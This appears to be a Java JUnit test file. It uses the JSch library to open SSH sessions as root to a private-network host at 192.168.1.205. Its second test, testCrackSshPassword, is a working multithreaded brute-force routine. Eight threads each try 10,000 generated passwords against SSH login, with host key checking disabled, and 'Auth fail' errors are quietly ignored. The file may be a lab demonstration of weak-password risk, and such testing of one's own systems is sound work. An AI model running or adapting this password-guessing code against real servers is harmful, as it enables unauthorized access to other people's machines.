package com.future.demo;

import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;
import org.junit.Test;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

public class Tests {
    @Test
    public void test() throws Exception {
        String username = "root";
        String host = "192.168.1.205";
        int port = 22;
        String password = "xxx";
        JSch jSch = new JSch();
        Session session = jSch.getSession(username, host, port);

        // 禁止 host key checking
        // https://stackoverflow.com/questions/2003419/com-jcraft-jsch-jschexception-unknownhostkey
        java.util.Properties config = new java.util.Properties();
        config.put("StrictHostKeyChecking", "no");
        session.setConfig(config);

        session.setPassword(password);
        session.connect(3000);
        session.disconnect();
    }

    @Test
    public void testCrackSshPassword() throws InterruptedException {
        AtomicInteger counter = new AtomicInteger();
        ExecutorService service = Executors.newCachedThreadPool();
        for (int i = 0; i < 8; i++) {
            int finalI = i;
            service.submit(() -> {
                for (int j = 0; j < 10000; j++) {
                    try {
                        String username = "root";
                        String host = "192.168.1.205";
                        int port = 22;
                        String password = "xxx" + finalI + j;
                        JSch jSch = new JSch();
                        Session session = jSch.getSession(username, host, port);

                        // 禁止 host key checking
                        // https://stackoverflow.com/questions/2003419/com-jcraft-jsch-jschexception-unknownhostkey
                        java.util.Properties config = new java.util.Properties();
                        config.put("StrictHostKeyChecking", "no");
                        session.setConfig(config);

                        session.setPassword(password);
                        session.connect();
                        session.disconnect();
                    } catch (Exception ex) {
                        if (!(ex instanceof JSchException && ((JSchException) ex).getMessage().contains("Auth fail"))) {
                            ex.printStackTrace();
                        }
                    } finally {
                        counter.incrementAndGet();
                        System.out.println("count=" + counter.get());
                    }
                }
            });
        }
        service.shutdown();
        while (!service.awaitTermination(1, TimeUnit.SECONDS)) ;
    }
}
